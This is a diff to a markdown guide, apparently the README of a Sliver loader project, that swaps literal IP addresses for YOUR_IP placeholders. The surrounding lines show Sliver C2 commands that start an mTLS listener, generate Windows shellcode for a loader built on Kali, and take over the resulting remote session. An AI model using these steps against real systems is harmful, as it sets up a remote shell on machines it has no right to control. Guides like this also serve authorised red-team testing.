@@ -124,8 +124,8 @@ sliver> generate --mtls YOUR_IP:8888 --os windows --arch amd64 --format shellcod
 
 **Example:**
 ```bash
-sliver> mtls -L 192.168.153.160 -l 8888
-sliver> generate --mtls 192.168.153.160:8888 --os windows --arch amd64 --format shellcode --save /opt/Sliver_Loader/sliver.bin
+sliver> mtls -L YOUR_IP -l 8888
+sliver> generate --mtls YOUR_IP:8888 --os windows --arch amd64 --format shellcode --save /opt/Sliver_Loader/sliver.bin
 ```
 
 ### Step 2: Build Loader on Kali
@@ -168,7 +168,7 @@ sliver> sessions
 # Example output:
 # ID  Name              Transport  Remote Address
 # ==  ====              =========  ==============
-# 1   CARING_MONKEY     mtls       192.168.1.50:54321
+# 1   CARING_MONKEY     mtls       YOUR_IP:54321
 
 # Interact
 sliver> use 1
